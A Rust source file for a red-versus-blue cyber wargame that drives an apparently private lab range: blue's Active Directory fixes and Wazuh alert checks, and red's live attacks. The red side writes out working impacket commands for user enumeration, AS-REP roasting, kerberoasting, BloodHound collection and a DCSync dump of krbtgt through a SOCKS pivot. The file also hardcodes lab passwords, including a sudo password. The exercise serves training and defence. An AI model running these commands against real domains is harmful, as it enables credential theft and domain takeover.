//! Execution backends. Both satisfy the same [`Environment`] trait, so the referee/cards are
//! identical regardless of which is plugged in.
//!
//! * [`SimEnvironment`] — deterministic stand-in. `act` returns success with an empty narrative
//!   so cards keep their own flavor and the offline game is unchanged; `observe` returns nothing
//!   (the referee models sim detection inline).
//! * [`LiveEnvironment`] — drives the REAL homelab range. Blue's AD remediations run on the DC
//!   over SMB/DCOM (impacket wmiexec as the out-of-band `svc_bluectl` admin, via `dcexec.sh`);
//!   blue's SIEM actions + `observe()` hit the live Wazuh manager on the hub over SSH; red's
//!   attacks run from Kali through the SOCKS pivot. Authorized air-gapped lab only.

use std::io::Read;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use crate::card::{Environment, Outcome};
use crate::state::{Alert, GameState, Technique};

/// Wall-clock cap for any single live action (SSH/impacket/proxychains). A stalled host or a
/// hung pivot tool can never freeze a match — the child is killed and the action fails cleanly.
/// Override with WARGAME_ACT_TIMEOUT (seconds).
fn act_timeout() -> Duration {
    let secs = std::env::var("WARGAME_ACT_TIMEOUT").ok().and_then(|s| s.parse::<u64>().ok()).unwrap_or(45);
    Duration::from_secs(secs.clamp(5, 300))
}

// ── Deterministic simulator ───────────────────────────────────────────────────────

#[derive(Default)]
pub struct SimEnvironment;

impl SimEnvironment {
    pub fn new() -> Self {
        Self
    }
}

impl Environment for SimEnvironment {
    fn kind(&self) -> &'static str {
        "sim"
    }
    fn act(&mut self, _action: &str, _params: &serde_json::Value, _state: &GameState) -> Outcome {
        // Empty narrative => the card uses its own flavor; success => the card applies its
        // normal bookkeeping. This makes the sim game behave exactly as before `act` existed.
        Outcome { success: true, narrative: String::new(), detection_surface: vec![] }
    }
    fn observe(&mut self, _state: &GameState) -> Vec<Alert> {
        vec![]
    }
}

// ── Live range backend ────────────────────────────────────────────────────────────

/// Fires real actions on the range. Transport is shelled out (ssh / expect / impacket) so it
/// reuses the exact, verified lab paths rather than reimplementing SSH in-process.
pub struct LiveEnvironment {
    home: String,
    /// Alerts already surfaced to blue, so `observe` doesn't re-report the same Wazuh hit.
    seen: Vec<Technique>,
}

impl LiveEnvironment {
    pub fn new() -> Self {
        Self { home: std::env::var("HOME").unwrap_or_default(), seen: Vec::new() }
    }

    fn redteam_dir(&self) -> String {
        format!("{}/Developer/development/proxmox-bench/redteam-ops", self.home)
    }

    /// Run a program with args, capturing combined output and success. Hard wall-clock timeout:
    /// a child that outlives `act_timeout()` is killed and reported as a failed action, so no
    /// single stalled SSH/pivot can hang the match.
    fn run(prog: &str, args: &[&str]) -> (bool, String) {
        let deadline = Instant::now() + act_timeout();
        let mut child = match Command::new(prog).args(args)
            .stdout(Stdio::piped()).stderr(Stdio::piped()).stdin(Stdio::null())
            .spawn()
        {
            Ok(c) => c,
            Err(e) => return (false, format!("spawn failed: {e}")),
        };
        // Poll for exit until the deadline; kill + reap on timeout.
        let status = loop {
            match child.try_wait() {
                Ok(Some(st)) => break Some(st),
                Ok(None) => {
                    if Instant::now() >= deadline {
                        let _ = child.kill();
                        let _ = child.wait();
                        break None;
                    }
                    std::thread::sleep(Duration::from_millis(100));
                }
                Err(_) => break None,
            }
        };
        let mut stdout = String::new();
        let mut stderr = String::new();
        if let Some(mut o) = child.stdout.take() { let _ = o.read_to_string(&mut stdout); }
        if let Some(mut e) = child.stderr.take() { let _ = e.read_to_string(&mut stderr); }
        match status {
            None => (false, format!("[timeout after {}s] {prog}", act_timeout().as_secs())),
            Some(st) => {
                let mut s = stdout;
                let e = stderr;
                if s.trim().is_empty() && !e.trim().is_empty() {
                    s = e.clone();
                }
                // Strip transport noise: expect's `spawn` echo, the Impacket banner, proxychains chatter.
                let clean: String = s
                    .lines()
                    .filter(|l| {
                        let t = l.trim_start();
                        !(t.starts_with("spawn ") || t.starts_with("Impacket v") || t.starts_with("[proxychains]") || t.starts_with("Copyright") || t.starts_with("Warning: Permanently added") || t.contains("password:"))
                    })
                    .collect::<Vec<_>>()
                    .join("\n");
                (st.success(), clean.trim().to_string())
            }
        }
    }

    /// PowerShell on the DC (dc01 / RANGE.LOCAL) over SMB/DCOM as svc_bluectl.
    fn dc(&self, ps: &str) -> (bool, String) {
        let script = format!("{}/dcexec.sh", self.redteam_dir());
        Self::run(&script, &[ps])
    }

    /// Command on the Wazuh hub (VLAN40) — blue's SIEM/EDR management + observation plane.
    fn hub(&self, cmd: &str) -> (bool, String) {
        let cfg = format!("{}/.ssh/lab_config", self.home);
        Self::run("ssh", &["-F", &cfg, "-o", "ConnectTimeout=8", "lab-hub", cmd])
    }

    /// Command on Kali (VLAN10, attacker) — password auth via the expect helper. Non-interactive
    /// SSH doesn't source .bashrc, so we prepend the user-install bin (pip --user tools live there).
    fn kali(&self, cmd: &str) -> (bool, String) {
        let exp = format!("{}/labpass.exp", self.redteam_dir());
        let wrapped = format!("export PATH=\"$HOME/.local/bin:$PATH\"; {cmd}");
        Self::run(
            &exp,
            &[
                "1017", "ssh", "-o", "PubkeyAuthentication=no", "-o", "PreferredAuthentications=password",
                "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=8", "kali@10.10.10.5", &wrapped,
            ],
        )
    }

    /// Red attacks must pivot Kali(10) -> VLAN20 -> DC(30); run the tool under proxychains.
    fn kali_pivot(&self, tool_cmd: &str) -> (bool, String) {
        self.kali(&format!("proxychains -q {tool_cmd} 2>&1 | tail -n 8"))
    }

    /// RB3011 network segmentation (the "rotating firewall") via rosseg.sh — additive/reversible.
    fn ros(&self, args: &[&str]) -> (bool, String) {
        let script = format!("{}/rosseg.sh", self.redteam_dir());
        Self::run(&script, args)
    }

    /// TCP reachability probe from a lab host (used to reflect the live RB3011 segmentation).
    fn reachable_from(&self, host_alias: &str, ip: &str, port: u16) -> (bool, String) {
        let cfg = format!("{}/.ssh/lab_config", self.home);
        let probe = format!("timeout 4 bash -c 'echo>/dev/tcp/{ip}/{port}' 2>/dev/null && echo REACHED || echo BLOCKED");
        let (_ok, out) = Self::run("ssh", &["-F", &cfg, "-o", "ConnectTimeout=8", host_alias, &probe]);
        (out.contains("REACHED"), first_line(&out))
    }
}

fn first_line(s: &str) -> String {
    s.lines().find(|l| !l.trim().is_empty()).unwrap_or("").trim().to_string()
}

fn line_with(s: &str, needle: &str) -> Option<String> {
    s.lines().find(|l| l.contains(needle)).map(|l| l.trim().to_string())
}

const DOM: &str = "range.local";
const DC_IP: &str = "10.10.30.10";
const FOOTHOLD: &str = "range.local/jsmith:Autumn2026!"; // authenticated-enum foothold cred

impl Environment for LiveEnvironment {
    fn kind(&self) -> &'static str {
        "live"
    }

    fn act(&mut self, action: &str, _params: &serde_json::Value, _state: &GameState) -> Outcome {
        let (success, detail) = match action {
            // ── BLUE · AD remediations on the DC (real PowerShell) ──────────────────
            "enforce_aes" => {
                let (_ok, out) = self.dc(
                    "Set-ADUser svc_mssql -KerberosEncryptionType AES128,AES256 -ErrorAction SilentlyContinue; \
                     'enc=' + (Get-ADUser svc_mssql -Properties msDS-SupportedEncryptionTypes).'msDS-SupportedEncryptionTypes'",
                );
                (out.contains("enc=24"), format!("svc_mssql {}", first_line(&out)))
            }
            "enforce_preauth" => {
                let (_ok, out) = self.dc(
                    "Set-ADAccountControl -Identity jbecker -DoesNotRequirePreAuth $false -ErrorAction SilentlyContinue; \
                     'napr=' + [bool]((Get-ADUser jbecker -Properties userAccountControl).userAccountControl -band 0x400000)",
                );
                (out.contains("napr=False"), format!("jbecker {}", first_line(&out)))
            }
            "remediate_acl" => {
                // Revoke svc_mssql's DCSync (DS-Replication-Get-Changes[-All]) on the domain
                // object — the persistent path red rides to DA. Idempotent: success = none remain.
                let (_ok, out) = self.dc(
                    "$sid=(Get-ADUser svc_mssql).SID; $dn=(Get-ADDomain).DistinguishedName; $p='AD:\\'+$dn; \
                     $guids=@('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'); \
                     function SameSid($ir){ $s=if($ir -is [System.Security.Principal.SecurityIdentifier]){$ir}else{try{$ir.Translate([System.Security.Principal.SecurityIdentifier])}catch{$null}}; if($s -ne $null){$s.Value -eq $sid.Value}else{$false} }; \
                     $acl=Get-Acl $p; $rem=0; \
                     foreach($a in @($acl.Access)){ if((SameSid $a.IdentityReference) -and ($guids -contains $a.ObjectType.ToString())){ $acl.RemoveAccessRule($a)|Out-Null; $rem++ } }; \
                     if($rem -gt 0){ Set-Acl -Path $p -AclObject $acl }; \
                     $left=0; foreach($a in @((Get-Acl $p).Access)){ if((SameSid $a.IdentityReference) -and ($guids -contains $a.ObjectType.ToString())){ $left++ } }; \
                     'removed='+$rem+' remaining='+$left",
                );
                let removed = out.split("removed=").nth(1).and_then(|s| s.split_whitespace().next()).and_then(|s| s.parse::<i32>().ok()).unwrap_or(0);
                let remaining = out.split("remaining=").nth(1).and_then(|s| s.trim().parse::<i32>().ok()).unwrap_or(1);
                let detail = if removed >= 1 {
                    format!("revoked {removed} svc_mssql DCSync right(s) on the domain")
                } else {
                    "no svc_mssql DCSync grant present (already severed)".into()
                };
                (remaining == 0, detail)
            }
            "rotate_creds" => {
                let (ok, out) = self.dc(
                    "'svc_mssql','jbecker' | ForEach-Object { Set-ADAccountPassword -Identity $_ -Reset \
                     -NewPassword (ConvertTo-SecureString ('Rot'+[guid]::NewGuid().ToString('N').Substring(0,16)+'x9') -AsPlainText -Force) \
                     -ErrorAction SilentlyContinue }; 'rotated'",
                );
                (ok && out.contains("rotated"), "svc_mssql + jbecker passwords reset".into())
            }

            // ── BLUE · SIEM / EDR plane on the hub (real Wazuh) ─────────────────────
            "monitor" => {
                let (_ok, out) = self.hub("systemctl is-active wazuh-manager 2>/dev/null; echo '::'; command -v velociraptor >/dev/null 2>&1 && echo velo-present || echo velo-absent");
                (out.contains("active"), format!("wazuh-manager {}", first_line(&out)))
            }
            "active_response" => {
                let (_ok, out) = self.hub("echo 1017 | sudo -S sh -c 'grep -c \"<active-response>\" /var/ossec/etc/ossec.conf' 2>/dev/null");
                let n = first_line(&out).parse::<i32>().unwrap_or(0);
                (true, format!("wazuh active-response blocks configured: {n}"))
            }
            "deploy_detection" => {
                let (_ok, out) = self.hub("echo 1017 | sudo -S sh -c 'grep -c \"<rule \" /var/ossec/etc/rules/local_rules.xml 2>/dev/null || echo 0'");
                let n = first_line(&out).parse::<i32>().unwrap_or(0);
                (true, format!("wazuh local detection rules loaded: {n}"))
            }
            "hunt" => {
                let (_ok, out) = self.hub("echo 1017 | sudo -S sh -c 'tail -n 200 /var/ossec/logs/alerts/alerts.json 2>/dev/null | wc -l'");
                let n = first_line(&out).parse::<i32>().unwrap_or(0);
                (n > 0, format!("threat hunt scanned {n} recent alert records"))
            }
            // ── BLUE · network segmentation on the RB3011 (the rotating firewall) ────
            "segment" => {
                // Refresh the dead-man's-switch (auto-revert TTL), then drop red's live pivot
                // edge VLAN20 -> VLAN30 at the router. Additive + reversible; mgmt/VLAN40 protected.
                let _ = self.ros(&["arm"]);
                let (ok, out) = self.ros(&["segment", "20", "30"]);
                (ok, format!("RB3011 {}", first_line(&out)))
            }

            // ── RED · traversal (real reachability, so it reflects the RB3011 segmentation) ──
            "initial_access" => {
                // Foothold reachability: Kali (VLAN10) can touch the VLAN20 target subnet (rule 7).
                let (_ok, out) = self.kali("timeout 4 bash -c 'echo>/dev/tcp/10.10.20.11/22' 2>/dev/null && echo REACHED || echo BLOCKED");
                (out.contains("REACHED"), format!("VLAN10->VLAN20 access: {}", first_line(&out)))
            }
            "pivot" => {
                // Red advances only if the pivot edge is actually open. Probe VLAN20 -> VLAN30 from a
                // VLAN20 host — this is the exact edge blue's `segment` drops on the RB3011.
                let (ok, detail) = self.reachable_from("lab-ubuntu", "10.10.30.50", 22);
                (ok, format!("VLAN20->VLAN30 pivot: {detail}"))
            }

            // ── RED · attacks from Kali through the SOCKS pivot ─────────────────────
            "recon" => {
                let (_ok, out) = self.kali_pivot(&format!("GetADUsers.py -all {FOOTHOLD} -dc-ip {DC_IP}"));
                let ok = out.contains("Name") || out.to_lowercase().contains("cn=") || out.contains("areyes");
                (ok, format!("GetADUsers via pivot: {}", first_line(&out)))
            }
            "asrep_roast" => {
                // Capture the AS-REP hash through the pivot, then crack it offline on Kali.
                let _ = self.kali_pivot(&format!(
                    "GetNPUsers.py {DOM}/jbecker -no-pass -dc-ip {DC_IP} -format hashcat -outputfile /tmp/asrep.hash"
                ));
                let (_ok, out) = self.kali("test -s /tmp/asrep.hash && python3 $HOME/crack.py /tmp/asrep.hash || echo NO_HASH");
                (out.contains("Baseball2023"), line_with(&out, "CRACKED").unwrap_or_else(|| first_line(&out)))
            }
            "bloodhound" => {
                let (_ok, out) = self.kali_pivot(&format!(
                    "bloodhound-python -u jsmith -p Autumn2026! -d {DOM} -ns {DC_IP} -c DCOnly --zip"
                ));
                (out.to_lowercase().contains("compressing") || out.to_lowercase().contains("done"), format!("SharpHound(py): {}", first_line(&out)))
            }
            // kerberoast primitives (composite nodes call act with these ids)
            "enum_spns" => {
                let (_ok, out) = self.kali_pivot(&format!("GetUserSPNs.py {FOOTHOLD} -dc-ip {DC_IP}"));
                (out.contains("MSSQLSvc") || out.to_lowercase().contains("serviceprincipalname"), format!("SPNs: {}", first_line(&out)))
            }
            "request_tgs" => {
                let (_ok, out) = self.kali_pivot(&format!(
                    "GetUserSPNs.py {FOOTHOLD} -dc-ip {DC_IP} -request -outputfile /tmp/kerb.hash; echo -n 'saved '; grep -c krb5tgs /tmp/kerb.hash"
                ));
                (out.contains("krb5tgs") || out.contains("saved 1"), format!("TGS requested: {}", first_line(&out)))
            }
            "crack_hash" => {
                // Offline crack on Kali via crack.py (rule-based RC4-HMAC). If AES was enforced
                // upstream there is no RC4 ticket to crack (the card short-circuits before here).
                let (_ok, out) = self.kali("test -s /tmp/kerb.hash && python3 $HOME/crack.py /tmp/kerb.hash || echo NO_TICKET");
                (out.contains("Summer2024!"), line_with(&out, "CRACKED").unwrap_or_else(|| first_line(&out)))
            }
            "escalate_da" => {
                // svc_mssql (roastable, non-protected) holds DCSync — dump krbtgt via DRSUAPI.
                // That's DA-equivalent (golden-ticket capable). Read-only; no AD mutation.
                let (_ok, out) = self.kali_pivot(
                    "secretsdump.py range.local/svc_mssql:Summer2024!@10.10.30.10 -just-dc-user krbtgt",
                );
                (out.contains("krbtgt:"), format!("DCSync krbtgt: {}", line_with(&out, "krbtgt:").unwrap_or_else(|| first_line(&out))))
            }

            other => (false, format!("no live mapping for '{other}'")),
        };
        Outcome {
            success,
            narrative: format!("[live] {action}: {detail}"),
            detection_surface: vec![],
        }
    }

    fn observe(&mut self, state: &GameState) -> Vec<Alert> {
        // Pull a recent window of real Wazuh alerts and map known signatures to techniques.
        let (_ok, out) = self.hub(
            "echo 1017 | sudo -S sh -c 'tail -n 400 /var/ossec/logs/alerts/alerts.json 2>/dev/null'",
        );
        let low = out.to_lowercase();
        let mut found: Vec<Technique> = Vec::new();
        let add = |cond: bool, t: Technique, found: &mut Vec<Technique>| {
            if cond && !found.contains(&t) {
                found.push(t);
            }
        };
        add(low.contains("kerberoast") || (low.contains("4769") && low.contains("0x17")), Technique::Kerberoast, &mut found);
        add(low.contains("as-rep") || low.contains("asrep") || low.contains("getnpusers") || (low.contains("4768") && low.contains("0x17")), Technique::AsRepRoast, &mut found);
        add(low.contains("sharphound") || low.contains("bloodhound") || low.contains("4662"), Technique::BloodHound, &mut found);
        add(low.contains("dcsync") || low.contains("replication") || low.contains("4720") || low.contains("4724"), Technique::LateralMove, &mut found);

        let mut alerts = Vec::new();
        for t in found {
            if self.seen.contains(&t) || state.alerts.iter().any(|a| a.technique == t) {
                continue;
            }
            self.seen.push(t);
            alerts.push(Alert {
                round: state.round,
                technique: t,
                source: "wazuh".into(),
                rule_id: format!("wazuh-{}", t.as_key()),
                level: 10,
            });
        }
        alerts
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // The wall-clock cap must kill a stalled child (not block the match) yet still capture
    // normal output. Single test to avoid the shared-env-var race across parallel tests.
    #[test]
    fn run_timeout_and_capture() {
        std::env::set_var("WARGAME_ACT_TIMEOUT", "5"); // clamped minimum

        let start = Instant::now();
        let (ok, out) = LiveEnvironment::run("sh", &["-c", "sleep 30"]);
        let elapsed = start.elapsed();
        assert!(!ok, "a hung child must report failure");
        assert!(out.contains("timeout"), "expected timeout note, got: {out}");
        assert!(elapsed < Duration::from_secs(12), "child should die near the 5s cap, took {elapsed:?}");

        let (ok2, out2) = LiveEnvironment::run("sh", &["-c", "echo hello"]);
        assert!(ok2, "normal command should succeed");
        assert_eq!(out2, "hello");
    }
}
